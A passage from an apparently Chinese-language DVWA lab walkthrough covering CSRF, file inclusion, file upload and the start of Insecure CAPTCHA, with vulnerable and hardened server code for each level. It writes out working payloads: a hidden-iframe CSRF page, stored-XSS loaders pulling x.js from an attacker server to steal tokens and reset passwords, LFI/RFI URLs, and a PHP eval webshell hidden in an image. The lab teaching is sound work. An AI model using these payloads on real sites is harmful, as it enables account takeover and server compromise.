	$pass_conf = $_GET[ 'password_conf' ];

	// Do the passwords match?
	if( $pass_new == $pass_conf ) {
		// They do!
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new );

		// Update the database
		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

		// Feedback for the user
		$html .= "<pre>Password Changed.</pre>";
	}
	else {
		// Issue with passwords matching
		$html .= "<pre>Passwords did not match.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

可以看到,High 级别的代码加入了 Anti-CSRF token 机制,用户每次访问改密页面时,服务器会返回一个随机的 token,向服务器发起请求时,需要提交 token 参数,而服务器在收到请求时,会优先检查 token,只有 token 正确,才会处理客户端的请求.

**漏洞利用**

要绕过 High 级别的反 CSRF 机制,关键是要获取 token,要利用受害者的 cookie 去修改密码的页面获取关键的 token.

试着去构造一个攻击页面,将其放置在攻击者的服务器,引诱受害者访问,从而完成 CSRF 攻击,下面是代码.

```html
<script type="text/javascript">
	function attack()
	{
	document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;
	document.getElementById("transfer").submit();
	}
</script>

<iframe src="http://<IP地址!!!>/dvwa/vulnerabilities/csrf" id="hack" border="0" style="display:none;">
</iframe>

<body onload="attack()">
<form method="GET" id="transfer" action="http://<IP地址!!!>/dvwa/vulnerabilities/csrf">
	<input type="hidden" name="password_new" value="password">
	<input type="hidden" name="password_conf" value="password">
	<input type="hidden" name="user_token" value="">
	<input type="hidden" name="Change" value="Change">
</form>

</body>
```

攻击思路是当受害者点击进入这个页面,脚本会通过一个看不见框架偷偷访问修改密码的页面,获取页面中的 token,并向服务器发送改密请求,以完成 CSRF 攻击.

然而理想与现实的差距是巨大的,这里牵扯到了跨域问题,而现在的浏览器是不允许跨域请求的.这里简单解释下跨域,我们的框架 iframe 访问的地址是 http://<dvwa靶机IP>/dvwa/vulnerabilities/csrf ,位于服务器 A 上,而我们的攻击页面位于黑客服务器 B 上,两者的域名不同,域名 B 下的所有页面都不允许主动获取域名 A 下的页面内容,除非域名 A 下的页面主动发送信息给域名 B 的页面,所以我们的攻击脚本是不可能取到改密界面中的 user_token.

由于跨域是不能实现的,所以我们要将攻击代码注入到 dvwa 靶机中,才有可能完成攻击.下面利用 High 级别的存储型 XSS 漏洞协助获取 Anti-CSRF token(因为这里的 XSS 注入有长度限制,不能够注入完整的攻击脚本,所以只获取 Anti-CSRF token).

注入代码如下
`<iframe src="../csrf" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)>`

**另类通关**

通过 XSS 获得 token 之后修改密码
同等级的 XSS-Stored $name 可被我们利用做 XSS,这样就可以配合 CSRF 来重置用户密码了.
需要先说明一下 DVWA 的数据库设计,guestbook 表的 name 字段类型为 varchar(100),也就是说最多 name 只能写入 100 个字符,超过的字符会被数据库抛弃不存储.

由于100个字符的限制,将payload分成多份提交
```js
<svg/onload="s='&#115;&#99;&#114;&#105;&#112;&#116;'">  # 事件内可以解析ASCII编码后的字符串
<svg/onload="j=document.createElement(s)">  # 拼接出一个script来引入外部js
<svg/onload="j.src='http://<服务器B>/x.js'">
<svg/onload="document.body.appendChild(j)">
```
这样就可以绕过后端的正则过滤

为了方便测试,在 x.js 里只写了 `alert('HelloDVWA')`

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa82.png)

发现成功了!!!x.js 被成功加载了.但多次加载还是有问题

使用延时,人工干预执行时序
```js
<svg/onload="setTimeout(function(){s='&#115;&#99;&#114;&#105;&#112;&#116;'},3000)">
<svg/onload="setTimeout(function(){j=document.createElement(s)},4000)">
<svg/onload="setTimeout(function(){j.src='http://<服务器B>/x.js'},5000)">
<svg/onload="setTimeout(function(){document.body.appendChild(j)},6000)">
```
稳定触发

下面修改 x.js
```js
ifr = document.createElement('iframe');
ifr.src="../csrf";
ifr.hidden=1;
document.body.appendChild(ifr);
setTimeout(function(){f=frames[0];t=f.document.getElementsByName('user_token')[0].value;i=document.createElement('img');i.src='../csrf/?password_new=admin&password_conf=admin&Change=Change&user_token='+t;},3000)
```

当管理员访问留言板 XSS-Stored 时候:
1. 会先加载 `x.js`
2. `x.js` 内的脚本内容,会创建一个隐藏的 `iframe` 标签到 `DOM`
3. 等待 `iframe` 创建完成之后,便通过创建一个 `img` 标签,自动触发修改密码的请求

### Impossible

**服务器端核心代码**
```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Get input
	$pass_curr = $_GET[ 'password_current' ];
	$pass_new  = $_GET[ 'password_new' ];
	$pass_conf = $_GET[ 'password_conf' ];

	// Sanitise current password input
	$pass_curr = stripslashes( $pass_curr );
	$pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass_curr = md5( $pass_curr );

	// Check that the current password is correct
	$data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
	$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
	$data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
	$data->execute();

	// Do both new passwords match and does the current password match the user?
	if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {
		// It does!
		$pass_new = stripslashes( $pass_new );
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new );

		// Update database with new password
		$data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
		$data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
		$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
		$data->execute();

		// Feedback for the user
		$html .= "<pre>Password Changed.</pre>";
	}
	else {
		// Issue with passwords matching
		$html .= "<pre>Passwords did not match or current password incorrect.</pre>";
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```
可以看到,Impossible 级别的代码利用 PDO 技术防御 SQL 注入,至于防护 CSRF,则要求用户输入原始密码(简单粗暴),攻击者在不知道原始密码的情况下,无论如何都无法进行 CSRF 攻击.

---

## File_Inclusion

File Inclusion,意思是文件包含(漏洞),是指当服务器开启 allow_url_include 选项时,就可以通过 php 的某些特性函数(include(),require() 和 include_once(),require_once())利用 url 去动态包含文件,此时如果没有对文件来源进行严格审查,就会导致任意文件读取或者任意命令执行.文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞,远程文件包含漏洞是因为开启了 php 置中的 allow_url_fopen 选项(选项开启之后,服务器允许包含一个远程的文件).

phpstudy开一下这2个参数
![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa15.png)

### Low

**服务器端核心代码**
```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>
```

可以看到,服务器端对 page 参数没有做任何的过滤跟检查.

服务器期望用户的操作是点击下面的三个链接,服务器会包含相应的文件,并将结果返回.需要特别说明的是,服务器包含文件时,不管文件后缀是否是 php,都会尝试当做 php 文件执行,如果文件内容确为 php,则会正常执行并返回结果,如果不是,则会原封不动地打印文件内容,所以文件包含漏洞常常会导致任意文件读取与任意命令执行.

点击 file1.php 后,显示如下

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa16.png)

而现实中,恶意的攻击者是不会乖乖点击这些链接的,因此 page 参数是不可控的.

**本地文件包含**

构造 url`http://<IP地址!!!>/dvwa/vulnerabilities/fi/page=/etc/shadow`
报错,显示没有这个文件,说明不是服务器系统不是 Linux,但同时暴露了服务器文件的绝对路径

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa17.png)

- **构造url(绝对路径)**

    `http://<IP地址!!!>/dvwa/vulnerabilities/fi/page=C:/phpStudy/PHPTutorial/WWW/DVWA/php.ini`

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa18.png)

    成功读取了服务器的 php.ini 文件

    `http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=file4.php`

- **构造url(相对路径)**

    `http://<IP地址!!!>/dvwa/vulnerabilities/fi/page=../../../../../../../../../phpStudy/PHPTutorial/WWW/DVWA/php.ini`

    加这么多 ../ 是为了保证到达服务器的C盘根目录,可以看到读取是成功的.

    ![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa19.png)

    同时我们看到,配置文件中的 Magic_quote_gpc 选项为 off.在 php 版本小于 5.3.4 的服务器中,当 Magic_quote_gpc 选项为 off 时,我们可以在文件名中使用 %00 进行截断,也就是说文件名中 %00 后的内容不会被识别,即下面两个 url 是完全等效的.

    1. http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=../../../../../../../../../phpStudy/PHPTutorial/WWW/DVWA/php.ini

    2. http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=../../../../../../../../../phpStudy/PHPTutorial/WWW/DVWA/php.ini%0012.php

    使用 %00 截断可以绕过某些过滤规则,例如要求 page 参数的后缀必须为 php,这时链接 A 会读取失败,而链接 B 可以绕过规则成功读取.

**远程文件包含**

当服务器的 php 配置中,选项 allow_url_fopen 与 allow_url_include 为开启状态时,服务器会允许包含远程服务器上的文件,如果对文件来源没有检查的话,就容易导致任意远程代码执行.

在远程服务器 B 上传一个 phpinfo.txt 文件,内容如下
```php
<?php

phpinfo();

?>
```

构造url `http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=http://<服务器B IP地址!!!>/phpinfo.txt`

成功在服务器上执行了 phpinfo 函数

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa20.png)

为了增加隐蔽性,可以对 http://<服务器B IP地址!!!>/phpinfo.txt 进行 URL 编码

例如

`http://192.168.72.128/dvwa/vulnerabilities/fi/?page=http://192.168.72.138/phpinfo.txt`

可以编码为

`http://192.168.72.128/dvwa/vulnerabilities/fi/?page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%37%32%2e%31%33%38%2f%70%68%70%69%6e%66%6f%2e%74%78%74` 同样可以执行成功

### Medium

**服务器端核心代码**
```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?>
```

可以看到,Medium 级别的代码增加了 str_replace 函数,对 page 参数进行了一定的处理,将"http:// "、"https://"、 " ../"、"..\"替换为空字符,即删除.

**相关函数**
- **str_replace()**
	str_replace() 函数以其他字符替换字符串中的一些字符(区分大小写).

	该函数必须遵循下列规则:
	- 如果搜索的字符串是数组,那么它将返回数组.
	- 如果搜索的字符串是数组,那么它将对数组中的每个元素进行查找和替换.
	- 如果同时需要对数组进行查找和替换,并且需要执行替换的元素少于查找到的元素的数量,那么多余元素将用空字符串进行替换
	- 如果查找的是数组,而替换的是字符串,那么替代字符串将对所有查找到的值起作用.

**漏洞利用**

使用 str_replace 函数是极其不安全的,因为可以使用双写绕过替换规则.

例如 `page=hthttp://tp://<IP地址!!!>/phpinfo.txt` 时,str_replace 函数会将 http:// 删除,于是 `page=http://<IP地址!!!>/phpinfo.txt`,成功执行远程命令.

同时,因为替换的只是"../"、"..\",所以对采用绝对路径的方式包含文件是不会受到任何限制的.

**本地文件包含**

`http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=..././..././..././..././..././..././..././..././..././phpStudy/PHPTutorial/WWW/DVWA/php.ini` 读取配置文件成功

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa21.png)

**远程文件包含**

`http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=hhttp://ttp://<服务器B IP地址!!!>/phpinfo.txt` 远程执行命令成功

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa22.png)

经过编码后的 url 不能绕过替换规则,因为解码是在浏览器端完成的,发送过去的 page 参数依然是http://<IP地址!!!>/phpinfo.txt,因此读取失败.

### High

**服务器端核心代码**
```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
	// This isn't the page we want!
	echo "ERROR: File not found!";
	exit;
}

?>
```
可以看到,High 级别的代码使用了 fnmatch 函数检查 page 参数,要求 page 参数的开头必须是 file,服务器才会去包含相应的文件.

**相关函数**
- **fnmatch(pattern,string,flags)**

	函数根据指定的模式来匹配文件名或字符串.

	此函数对于文件名尤其有用,但也可以用于普通的字符串.普通用户可能习惯于 shell 模式或者至少其中最简单的形式 '?' 和 '*' 通配符,因此使用 fnmatch() 来代替 ereg() 或者 preg_match() 来进行前端搜索表达式输入对于非程序员用户更加方便.

注:fnmatch 函数适用于 PHP >= 4.3.0,因此 php 版本高于这个才能利用,否则会出现打不开 high 等级页面.

**漏洞利用**

High 级别的代码规定只能包含 file 开头的文件,看似安全,不幸的是我们依然可以利用 file 协议绕过防护策略.file 协议其实我们并不陌生,当我们用浏览器打开一个本地文件时,用的就是 file 协议.

构造 url `http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=file://C:/phpStudy/PHPTutorial/WWW/DVWA/php.ini`

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa23.png)

至于执行任意命令,需要配合文件上传漏洞利用.首先需要上传一个内容为 php 的文件,然后再利用 file 协议去包含上传文件(需要知道上传文件的绝对路径),从而实现任意命令执行.

### Impossible

**服务器端核心代码**
```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
	// This isn't the page we want!
	echo "ERROR: File not found!";
	exit;
}

?>
```

可以看到,Impossible 级别的代码使用了白名单机制进行防护,简单粗暴,page 参数必须为"include.php"、"file1.php"、"file2.php"、"file3.php"之一,彻底杜绝了文件包含漏洞.

---

## File_Upload

File Upload,即文件上传漏洞,通常是由于对上传文件的类型、内容没有进行严格的过滤、检查,使得攻击者可以通过上传木马获取服务器的 webshell 权限,因此文件上传漏洞带来的危害常常是毁灭性的,Apache、Tomcat、Nginx 等都曝出过文件上传漏洞.

先看常规的文件上传操作

**客户端上传**

在HTML `<form>` 标签中 enctype 属性规定在发送到服务器之前应该如何对表单数据进行编码.它的值有三种:
```
application/x-www-form-urlencoded: 在发送前编码所有字符(默认)

multipart/form-data: 不对字符编码.在使用包含文件上传控件的表单时,必须使用该值.

text/plain: 空格转换为 "+" 加号,但不对特殊字符编码.
```

**服务端接收**

使用 `$_FILES` 数组接收参数.
打印 $_FILES `print_r($_FILES);` 发现上传一个文件时的属性有
```
[name] => feng.jpeg     文件的名称
[type] => image/jpeg 	文件的MIME类型
[tmp_name] => C:\Users\Administrator\AppData\Local\Temp\php2007.tmp  文件的临时位置
[error] => 0       文件的错误信息  0 ok      1234 error
[size] => 2859    文件的大小
```

文件上传漏洞的利用的条件
```
1. 能够成功上传木马文件
2. 上传文件必须能够被执行
3. 上传文件的路径必须可知
```

### Low

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// Can we move the file to the upload folder?
	if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
		// No
		$html .= '<pre>Your image was not uploaded.</pre>';
	}
	else {
		// Yes!
		$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
	}
}

?>
```

- **basename(path,suffix)**

    函数返回路径中的文件名部分,如果可选参数 suffix 为空,则返回的文件名包含后缀名,反之不包含后缀名.

	参数介绍:

	$path: 必需.规定要检查的路径.在 Windows中,斜线(/)和反斜线(\)都可以用作目录分隔符.在其它环境下是斜线(/).

	$suffix: 可选.规定文件扩展名.如果文件有 suffix,则不会输出这个扩展名.

可以看到,服务器对上传文件的类型、内容没有做任何的检查、过滤,存在明显的文件上传漏洞,生成上传路径后,服务器会检查是否上传成功并返回相应提示信息.

**漏洞利用**

文件上传漏洞的利用是有限制条件的,首先当然是要能够成功上传木马文件,其次上传文件必须能够被执行,最后就是上传文件的路径必须可知.不幸的是,这里三个条件全都满足.

上传文件 shell.php(一句话木马)
```php
<?php @eval($_POST['ant']); ?>
```

上传成功,并且返回了上传路径

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa24.png)

注:这里推荐用开源的 [antSword](https://github.com/AntSwordProject/antSword) 连接webshell,安装步骤这里略

`http://<IP地址!!!>/dvwa/hackable/uploads/shell.php`

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa25.png)

然后 antSword 就会通过向服务器发送包含 ant 参数的 post 请求,在服务器上执行任意命令,获取 webshell 权限.可以下载、修改服务器的所有文件.

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa26.png)

### Medium

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// File information
	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
	$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

	// Is it an image?
	if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
		( $uploaded_size < 100000 ) ) {

		// Can we move the file to the upload folder?
		if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
			// No
			$html .= '<pre>Your image was not uploaded.</pre>';
		}
		else {
			// Yes!
			$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
		}
	}
	else {
		// Invalid file
		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
	}
}

?>
```

可以看到,Medium 级别的代码对上传文件的类型、大小做了限制,要求文件类型必须是 jpeg 或者 png,大小不能超过 100000B(约为 97.6KB).

**组合拳(文件包含+文件上传)**

因为采用的是一句话木马,所以文件大小不会有问题,至于文件类型的检查,尝试修改文件名为 shell.png , 上传成功

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa27.png)

尝试使用 antSword 连接,不幸的是,虽然成功上传了文件,但是并不能成功获取 webshell 权限,在 antSword 上会报错

这是因为 antSword 的原理是向上传文件发送包含 ant 参数的 post 请求,通过控制 ant 参数来执行不同的命令,而这里服务器将木马文件解析成了图片文件,因此向其发送 post 请求时,服务器只会返回这个"图片"文件,并不会执行相应命令.

这里可以借助 Medium 级别的文件包含漏洞来获取 webshell 权限
`http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=hthttp://tp://<IP地址!!!>/dvwa/hackable/uploads/shell.png`

`http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=..././..././..././..././..././..././..././..././..././phpStudy/PHPTutorial/WWW/dvwa/hackable/uploads/shell.php`

注: 这里的 post 需要一个带 Medium 级别的 cookie 请求,antSword 现在貌似不支持带 cookie 访问,我是自己配置 burp 代理,用 burp 抓包加上 cookie 进行访问的

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa28.png)
![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa29.png)

**抓包修改文件类型**
上传 shell.png 文件,抓包.

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa30.png)

可以看到文件类型为 image/png,尝试修改 filename 为 shell.php.

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa31.png)

上传成功.上 antSword 连接

**截断绕过规则**

在 php 版本小于 5.3.4 的服务器中,当 Magic_quote_gpc 选项为 off 时,可以在文件名中使用 %00 截断,所以可以把上传文件命名为 shell.php%00.png.

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa32.png)

可以看到,包中的文件类型为 image/png,可以通过文件类型检查.上传成功.
![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa33.png)

而服务器会认为其文件名为 shell.php,顺势解析为 php 文件.

### High

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// File information
	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
	$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

	// Is it an image?
	if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
		( $uploaded_size < 100000 ) &&
		getimagesize( $uploaded_tmp ) ) {

		// Can we move the file to the upload folder?
		if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
			// No
			$html .= '<pre>Your image was not uploaded.</pre>';
		}
		else {
			// Yes!
			$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
		}
	}
	else {
		// Invalid file
		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
	}
}

?>
```
- **strrpos(string,find,start)**

    函数返回字符串 find 在另一字符串 string 中最后一次出现的位置,如果没有找到字符串则返回 false,可选参数 start 规定在何处开始搜索.

- **strtolower(string)**

	把字符串转换为小写.

- **getimagesize(string filename)**

    函数会通过读取文件头,返回图片的长、宽等信息,如果没有相关的图片文件头,函数会报错.

可以看到,High 级别的代码读取文件名中最后一个 `.` 后的字符串,期望通过文件名来限制文件类型,因此要求上传文件名形式必须是 `*.jpg`、`*.jpeg` 、`*.png` 之一.同时,getimagesize 函数更是限制了上传文件的文件头必须为图像类型.

漏洞利用
采用 %00 截断的方法可以轻松绕过文件名的检查,但是需要将上传文件的文件头伪装成图片,这里只演示如何借助 High 级别的文件包含漏洞来完成攻击.

科普下文件头相关的知识,常见的图片格式的文件头标识如下:
```
JPEG/JPG - 文件头标识 (2 bytes): FF D8 (SOI) (JPEG 文件标识) - 文件结束标识 (2 bytes): FF D9 (EOI)

PNG - 文件头标识 (8 bytes)   89 50 4E 47 0D 0A 1A 0A

GIF - 文件头标识 (6 bytes)   47 49 46 38 39(37) 61 |GIF89(7)a
```

更多格式的文件头标识参见文章: [通过文件头标识判断图片格式](https://www.cnblogs.com/Wendy_Yu/archive/2011/12/27/2303118.html)

文件头欺骗:伪造文件头,使文件头标识一样,其它部分我们修改为一句话木马,也就成了我们常说的图片一句话.

首先利用 copy 将一句话木马文件 php.php 与图片文件 1.jpg 合并

`copy 1.jpg/b+php.php/a shell.jpg`

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa34.png)

打开可以看到,一句话木马藏到了最后.顺利通过文件头检查,可以成功上传.

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa35.png)

注:我在 win10 裸机上进行的 phpstury 环境搭建,在这一步上传过程中,一直失败,后来发现是 windows defender 把上传上来的图片马杀掉了,所以出现同类问题可以检查下杀软情况

antSword 连接:

`http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=file:///C:/phpStudy/PHPTutorial/WWW/dvwa/hackable/uploads/shell.jpg`

这里和上面一样,自己抓包加上 cookie

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa36.png)

### Impossible

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );


	// File information
	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
	$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
	$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

	// Where are we going to be writing to?
	$target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
	//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
	$target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
	$temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
	$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;

	// Is it an image?
	if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&
		( $uploaded_size < 100000 ) &&
		( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&
		getimagesize( $uploaded_tmp ) ) {

		// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
		if( $uploaded_type == 'image/jpeg' ) {
			$img = imagecreatefromjpeg( $uploaded_tmp );
			imagejpeg( $img, $temp_file, 100);
		}
		else {
			$img = imagecreatefrompng( $uploaded_tmp );
			imagepng( $img, $temp_file, 9);
		}
		imagedestroy( $img );

		// Can we move the file to the web root from the temp folder?
		if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
			// Yes!
			$html .= "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>";
		}
		else {
			// No
			$html .= '<pre>Your image was not uploaded.</pre>';
		}

		// Delete any temp files
		if( file_exists( $temp_file ) )
			unlink( $temp_file );
	}
	else {
		// Invalid file
		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

- **in_get(varname)**

    函数返回相应选项的值

- **imagecreatefromjpeg ( filename )**

    函数返回图片文件的图像标识,失败返回false

- **imagejpeg ( image , filename , quality)**

    从image图像以filename为文件名创建一个JPEG图像,可选参数quality,范围从 0(最差质量,文件更小)到 100(最佳质量,文件最大).

- **imagedestroy( img )**

    函数销毁图像资源

可以看到,Impossible 级别的代码对上传文件进行了重命名(为 md5 值,导致 %00 截断无法绕过过滤规则),加入 Anti-CSRF token 防护 CSRF 攻击,同时对文件的内容作了严格的检查,导致攻击者无法上传含有恶意脚本的文件.

---

## Insecure_CAPTCHA

Insecure CAPTCHA,意思是不安全的验证码,CAPTCHA 是 Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称.但个人觉得,这一模块的内容叫做不安全的验证流程更妥当些,因为这块主要是验证流程出现了逻辑漏洞,谷歌的验证码表示不背这个锅.

这一步服务器可以不需要翻墙,主要在于绕过验证码
去 https://www.google.com/recaptcha/admin/create 申请下 key,信息随便填

在`dvwa\config\config.inc.php`中加入如下API key
```
$_DVWA[ 'recaptcha_public_key' ]  = '你的公钥';
$_DVWA[ 'recaptcha_private_key' ] = '你的私钥';
```

**reCAPTCHA 验证流程**

这一模块的验证码使用的是 Google 提供 reCAPTCHA 服务,下图是验证的具体流程.

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa37.png)

服务器通过调用 recaptcha_check_answer 函数检查用户输入的正确性.

recaptcha_check_answer($privkey,$remoteip, $challenge,$response)

数 $privkey 是服务器申请的 private key ,$remoteip 是用户的 ip,$challenge 是recaptcha_challenge_field 字段的值,来自前端页面 ,$response是 recaptcha_response_field 字段的值.函数返回 ReCaptchaResponse class 的实例,ReCaptchaResponse 类有2个属性 :
1. $is_valid 是布尔型的,表示校验是否有效,
2. $error 是返回的错误代码.

### Low

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
	// Hide the CAPTCHA form
	$hide_form = true;

	// Get input
	$pass_new  = $_POST[ 'password_new' ];
	$pass_conf = $_POST[ 'password_conf' ];

	// Check CAPTCHA from 3rd party
	$resp = recaptcha_check_answer(
		$_DVWA[ 'recaptcha_private_key'],
		$_POST['g-recaptcha-response']
	);

	// Did the CAPTCHA fail?
	if( !$resp ) {
		// What happens when the CAPTCHA was entered incorrectly
		$html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
		$hide_form = false;
		return;
	}
	else {
		// CAPTCHA was correct. Do both new passwords match?
		if( $pass_new == $pass_conf ) {
			// Show next stage for the user
			$html .= "
				<pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
				<form action=\"#\" method=\"POST\">
					<input type=\"hidden\" name=\"step\" value=\"2\" />
					<input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
